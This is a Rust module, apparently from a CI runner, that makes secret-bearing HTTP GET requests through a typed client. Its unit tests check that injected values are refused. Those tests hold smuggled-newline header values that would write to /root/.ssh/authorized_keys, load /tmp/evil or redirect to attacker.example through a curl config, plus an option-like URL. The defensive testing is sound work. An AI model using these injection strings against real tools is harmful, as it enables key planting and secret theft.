//! The one way the runner makes an HTTP request of its own. Both callers
//! (the Gitea API, which `tea` has no generic subcommand for, and
//! CLIProxyAPI's management API) send a secret in a header, so the request is
//! built with a typed client rather than assembled as text for a child
//! process: a `HeaderValue` cannot be anything but a header value, and a
//! `Url` cannot be read as an option.

use std::sync::OnceLock;
use std::time::Duration;

use anyhow::{Context, Result, anyhow};
use reqwest::blocking::Client;
use reqwest::header::HeaderValue;

/// GET `url`, optionally with one header, and return the HTTP status and the
/// body. `Err` means no HTTP conversation happened at all — an error response
/// is a status, not an error, so callers can tell "the forge said 404" from
/// "the forge never answered".
pub fn get(url: &str, header: Option<(&str, &str)>, timeout_secs: u64) -> Result<(u16, String)> {
    let mut request = client()?
        .get(url)
        .timeout(Duration::from_secs(timeout_secs));
    if let Some((name, value)) = header {
        request = request.header(name, secret(name, value)?);
    }
    let response = request
        .send()
        .with_context(|| format!("failed to GET {url}"))?;
    let status = response.status().as_u16();
    // Read as bytes rather than as text: both bodies are JSON, which is
    // UTF-8 by definition, so there is no charset to negotiate and a body
    // that isn't JSON at all is the caller's error to report.
    let body = response
        .bytes()
        .with_context(|| format!("failed to read the answer to {url}"))?;
    Ok((status, String::from_utf8_lossy(&body).into_owned()))
}

/// The shared client. Built once: a blocking client owns a connection pool
/// and the thread the runtime lives on, and the proxy probe runs on the
/// event stream's tick.
fn client() -> Result<&'static Client> {
    static CLIENT: OnceLock<std::result::Result<Client, String>> = OnceLock::new();
    CLIENT
        .get_or_init(|| {
            // reqwest is built without a rustls provider (see `Cargo.toml`),
            // so one has to be in place before the first handshake. An `Err`
            // here only means something else installed one first, which is
            // just as good.
            let _ = rustls::crypto::ring::default_provider().install_default();
            Client::builder()
                // No redirect following, which is also curl's default and
                // what the previous implementation therefore did. Both
                // callers address an API they configured; a 3xx from one is
                // a misconfiguration to report, not a hop to take with the
                // secret header still attached.
                .redirect(reqwest::redirect::Policy::none())
                .build()
                .map_err(|err| err.to_string())
        })
        .as_ref()
        .map_err(|err| anyhow!("failed to build the http client: {err}"))
}

/// One header value holding a secret the runner was handed — a forge token,
/// the proxy's management key.
///
/// It is untrusted text: it arrives over the settings API as arbitrary JSON,
/// or straight out of a hand-edited `config.json`, which `SettingsStore::load`
/// deserializes without going through the UI's validation at all. `HeaderValue`
/// is what makes that safe to send: it accepts only visible ASCII plus tab, so
/// a newline or a NUL is refused here instead of becoming part of the request.
fn secret(name: &str, value: &str) -> Result<HeaderValue> {
    let mut value = HeaderValue::from_str(value)
        .with_context(|| format!("the {name} value is not a usable header value"))?;
    // Keeps the secret out of `Debug` output and out of any header the client
    // would otherwise carry across a redirect.
    value.set_sensitive(true);
    Ok(value)
}

#[cfg(test)]
mod tests {
    use std::io::{Read, Write};
    use std::net::TcpListener;

    use super::*;

    /// Answer one request on a loopback port and hand back what was asked,
    /// so a test can see the request that actually went out.
    fn serve_once(response: &'static str) -> (String, std::thread::JoinHandle<String>) {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let url = format!("http://{}/probe", listener.local_addr().unwrap());
        let handle = std::thread::spawn(move || {
            let (mut stream, _) = listener.accept().unwrap();
            let mut request = Vec::new();
            // The request has no body, so it ends at the blank line; reading
            // to EOF would wait for the client to hang up first.
            loop {
                let mut byte = [0u8; 1];
                if stream.read(&mut byte).unwrap_or(0) == 0 {
                    break;
                }
                request.push(byte[0]);
                if request.ends_with(b"\r\n\r\n") {
                    break;
                }
            }
            stream.write_all(response.as_bytes()).unwrap();
            String::from_utf8_lossy(&request).into_owned()
        });
        (url, handle)
    }

    /// The whole path a secret takes, end to end: into the header map and out
    /// as exactly the bytes it started as.
    #[test]
    fn the_secret_reaches_the_server_as_the_header_it_was() {
        let token = r#"token a"b\c"#;
        let (url, server) = serve_once(
            "HTTP/1.1 200 OK\r\nContent-Length: 11\r\nConnection: close\r\n\r\n{\"ok\":true}",
        );
        let answer = get(&url, Some(("Authorization", token)), 5).unwrap();
        let request = server.join().unwrap();
        assert_eq!(answer, (200, "{\"ok\":true}".to_owned()));
        assert!(
            request.contains(&format!("authorization: {token}\r\n")),
            "{request}"
        );
    }

    /// An error response is a status, not an error: the proxy probe has to
    /// tell a management API that said 401 from one that never answered.
    #[test]
    fn an_http_error_comes_back_as_a_status() {
        let (url, _server) = serve_once(
            "HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\nConnection: close\r\n\r\n",
        );
        assert_eq!(get(&url, None, 5).unwrap(), (401, String::new()));
    }

    /// Nothing answers on a closed port, so there was no conversation to
    /// report a status for.
    #[test]
    fn an_unreachable_url_is_an_error() {
        // Bound and dropped: the port was free a moment ago, so nothing is
        // listening on it now.
        let port = TcpListener::bind("127.0.0.1:0")
            .unwrap()
            .local_addr()
            .unwrap()
            .port();
        assert!(get(&format!("http://127.0.0.1:{port}/"), None, 5).is_err());
    }

    /// A base URL out of an unvalidated `config.json` is not a command line:
    /// one starting with a dash is simply not a URL, and fails as one.
    #[test]
    fn a_url_that_would_have_read_as_an_option_is_refused() {
        let err = get("--output=/tmp/pwned", None, 5).unwrap_err();
        assert!(
            format!("{err:#}").contains("--output=/tmp/pwned"),
            "{err:#}"
        );
    }

    /// A secret carrying a newline used to be able to add lines of its own to
    /// the config curl read off stdin, where `output` writes a file and
    /// `config` reads another one. There is no header value those bytes could
    /// make, so they are refused before a request is built.
    #[test]
    fn a_secret_that_is_not_a_header_value_is_refused() {
        for value in [
            "tok\noutput = /root/.ssh/authorized_keys",
            "tok\"\nconfig = /tmp/evil",
            "tok\rurl = http://attacker.example",
            "tok\0",
        ] {
            assert!(
                secret("Authorization", value).is_err(),
                "{value:?} should be refused"
            );
        }
    }

    /// The quote and the backslash that used to need escaping are ordinary
    /// characters in a header value, and survive as themselves.
    #[test]
    fn a_quote_or_a_backslash_needs_no_escaping() {
        let value = secret("X-Management-Key", r#"a"b\c"#).unwrap();
        assert_eq!(value.as_bytes(), br#"a"b\c"#);
    }
}
